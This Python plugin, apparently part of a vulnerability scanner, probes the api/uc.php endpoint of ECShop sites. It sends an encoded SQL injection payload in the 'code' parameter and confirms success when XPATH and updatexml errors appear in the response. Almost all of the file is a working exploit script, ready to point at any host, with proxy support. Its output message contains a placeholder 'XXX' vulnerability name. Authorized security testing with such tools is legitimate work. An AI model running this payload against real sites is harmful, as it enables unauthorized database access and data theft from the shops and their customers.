#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ecshop uc.php参数code SQL注入
referer: http://www.wooyun.org/bugs/WooYun-2016-174468
author: Lucifer
description: 文件uc.php中,参数code存在SQL注入。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/api/uc.php?code=6116diQV4NziG3G8ttFnwTYmEp60E3K27Q0fDWaey%2bTuNLsGKdb1%2b6bPFT%2fIjJEMPlzS5Tm3InnRZKczTQBFXzXmDD5bs4Il5pbFswzA9SWE4gqcbuN8LgLJlTQqvVeSRUfFn4dhgto6yjPsJp7Za6GJEQ"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    payload_url = scheme+"://"+url+payload
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url,  headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('xpath')!=-1 and con.lower().find('updatexml')!=-1:
            Medusa = "{} 存在XXX漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass